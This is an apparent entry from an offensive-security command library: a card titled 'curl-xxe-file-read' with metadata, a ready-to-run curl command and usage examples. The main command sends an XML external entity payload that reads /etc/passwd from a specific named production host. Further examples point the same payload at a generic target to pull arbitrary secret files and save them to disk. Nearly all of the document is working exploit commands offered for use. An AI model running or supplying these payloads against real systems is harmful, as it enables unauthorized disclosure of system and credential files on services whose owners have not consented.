---
data: >-
  curl -X POST https://sms-be-vip.twitter.com/api/sxmp/1.0 -H 'Content-Type:
  application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
  "file:///etc/passwd">]><foo>&xxe;</foo>'
tags:
  - xxe
  - file-disclosure
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 241cbb0a-4c0a-403e-8b6a-a8fe3e8b0e84
created_at: '2025-12-13T08:59:40.097Z'
updated_at: '2025-12-13T08:59:40.097Z'
verified: false
validated: true
submitted: true
---
# curl-xxe-file-read

## Command

```bash
curl -X POST https://sms-be-vip.twitter.com/api/sxmp/1.0 \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

## Description

This command sends a POST request with a malicious XML payload to exploit an XXE vulnerability, reading and disclosing the contents of a local file like /etc/passwd.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H 'Content-Type: application/xml'` | Sets the content type to XML | Yes |
| `-d 'xml_payload'` | The malicious XML data with XXE entity | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/api -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### Advanced Usage

```bash
curl -X POST https://target.com/api -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///path/to/secret">]><foo>&xxe;</foo>' -o output.txt
```

## Expected Output

The server response includes the contents of the referenced file in the error message or body.

## Related

- [[commands/curl-xxe-outbound-request]]
- [[procedures/Exploit-XXE-for-Local-File-Read]]
